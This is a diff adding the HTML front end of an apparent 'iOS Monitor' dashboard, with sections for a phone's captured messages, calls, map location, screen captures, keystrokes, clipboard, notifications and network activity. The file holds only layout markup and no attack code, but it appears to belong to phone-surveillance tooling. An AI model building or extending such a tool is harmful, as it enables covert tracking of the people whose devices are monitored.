@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>iOS Monitor Dashboard</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<div id="sidebar">
+  <h1>iOS Monitor</h1>
+  <div id="status-bar">
+    <div id="ws-status" class="status-dot disconnected"></div>
+    <span id="ws-label">Disconnected</span>
+  </div>
+  <div id="summary-stats"></div>
+  <nav id="nav">
+    <a href="#" data-section="live" class="active">Live Feed</a>
+    <a href="#" data-section="messages">Messages</a>
+    <a href="#" data-section="calls">Calls</a>
+    <a href="#" data-section="location">Location</a>
+    <a href="#" data-section="screens">Screen Captures</a>
+    <a href="#" data-section="apps">App Usage</a>
+    <a href="#" data-section="network">Network</a>
+    <a href="#" data-section="keystrokes">Keystrokes</a>
+    <a href="#" data-section="notifications">Notifications</a>
+    <a href="#" data-section="clipboard">Clipboard</a>
+    <a href="#" data-section="device">Device Status</a>
+  </nav>
+  <div id="search-box">
+    <input type="text" id="search-input" placeholder="Search messages, URLs, apps...">
+  </div>
+</div>
+<div id="main">
+  <div id="section-live" class="section active"></div>
+  <div id="section-messages" class="section"></div>
+  <div id="section-calls" class="section"></div>
+  <div id="section-location" class="section"><div id="map"></div></div>
+  <div id="section-screens" class="section"></div>
+  <div id="section-apps" class="section"></div>
+  <div id="section-network" class="section"></div>
+  <div id="section-keystrokes" class="section"></div>
+  <div id="section-notifications" class="section"></div>
+  <div id="section-clipboard" class="section"></div>
+  <div id="section-device" class="section"></div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="/static/app.js"></script>
+</body>
+</html>
